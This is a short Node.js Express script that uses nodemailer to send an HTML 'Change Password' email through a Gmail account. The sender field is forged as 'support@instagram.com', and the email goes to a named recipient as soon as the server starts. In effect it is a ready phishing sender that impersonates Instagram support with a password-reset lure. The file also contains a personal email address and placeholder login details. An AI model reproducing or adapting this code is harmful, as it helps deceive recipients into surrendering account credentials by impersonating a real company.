const express = require("express");
const app = express();
const port = 8000;
const nodemailer = require('nodemailer');
const fs = require('fs').promises;
const path = require('path');

// Specify the path to your HTML template
const templatePath = path.resolve(__dirname, 'index.html');

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'inc.meta.ig@gmail.com',
        pass: 'passKey'
    }
});

// Create a function to read the HTML template
const readHTMLTemplate = async () => {
    try {
        const html = await fs.readFile(templatePath, 'utf-8');
        return { html };
    } catch (error) {
        console.error('Error reading HTML template:', error);
        throw error;
    }
};

// Create a function to render the email template
const renderTemplate = async () => {
    try {
        // Read the HTML template
        const { html } = await readHTMLTemplate();

        return { html };
    } catch (error) {
        console.error('Error rendering template:', error);
        throw error;
    }
};

// Send email using the rendered template
const sendEmail = async () => {
    try {
        const { html } = await renderTemplate();

        const mailOptions = {
            from: 'support@instagram.com',
            to: 'arieskm70@gmail.com',
            subject: 'Change Password',
            html: html
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.error(error);
            } else {
                console.log('Email sent:', info.response);
            }
        });
    } catch (error) {
        console.error('Error sending email:', error);
    }
};

app.listen(port, () => {
    console.log("Listening on port", port);
    // Trigger the email sending process when the server starts
    sendEmail();
});
